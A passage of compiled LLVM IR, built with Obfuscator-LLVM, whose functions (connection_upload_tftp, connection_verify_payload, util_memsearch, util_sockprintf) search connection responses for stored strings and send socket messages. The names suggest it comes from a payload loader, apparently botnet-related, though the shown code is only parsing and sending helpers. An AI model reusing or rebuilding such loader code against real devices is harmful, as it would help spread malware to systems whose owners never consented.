  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_upload_tftp(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %22, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.38, i64 0, i64 0), i32 17)
  %10 = icmp eq i32 %9, -1
  br i1 %10, label %13, label %11

; <label>:11:                                     ; preds = %8
  %12 = sub nsw i32 0, %6
  br label %22

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i64 0, i64 0), i32 7)
  %15 = icmp eq i32 %14, -1
  br i1 %15, label %18, label %16

; <label>:16:                                     ; preds = %13
  %17 = sub nsw i32 0, %6
  br label %22

; <label>:18:                                     ; preds = %13
  %19 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i64 0, i64 0), i32 14)
  %20 = icmp eq i32 %19, -1
  %21 = sub nsw i32 0, %6
  %. = select i1 %20, i32 %6, i32 %21
  ret i32 %.

; <label>:22:                                     ; preds = %1, %16, %11
  %.0 = phi i32 [ %12, %11 ], [ %17, %16 ], [ 0, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_verify_payload(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.41, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %12, label %8

; <label>:8:                                      ; preds = %1
  %9 = tail call i32 @util_memsearch(i8* %2, i32 %6, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i64 0, i64 0), i32 14)
  %10 = icmp eq i32 %9, -1
  %11 = add nsw i32 %6, 255
  %. = select i1 %10, i32 %6, i32 %11
  ret i32 %.

; <label>:12:                                     ; preds = %1
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_cleanup(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #4 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #0 {
  %3 = alloca [4098 x i8], align 16
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = getelementptr inbounds [4098 x i8], [4098 x i8]* %3, i64 0, i64 0
  %8 = call i32 @vsnprintf(i8* nonnull %7, i64 4096, i8* %1, %struct.__va_list_tag* nonnull %5) #7
  call void @llvm.va_end(i8* nonnull %6)
  %9 = icmp sgt i32 %8, 0
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %2
  %11 = icmp slt i32 %8, 4096
  %. = select i1 %11, i32 %8, i32 4096
  %12 = sext i32 %. to i64
  %13 = call i64 @send(i32 %0, i8* nonnull %7, i64 %12, i32 16384) #7
  %14 = icmp eq i64 %13, %12
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10, %2
  br label %16

; <label>:16:                                     ; preds = %10, %15
  %.06 = phi i8 [ 1, %15 ], [ 0, %10 ]
  ret i8 %.06
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: nounwind
declare i32 @vsnprintf(i8* nocapture, i64, i8* nocapture readonly, %struct.__va_list_tag*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #7

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { cold }
attributes #9 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
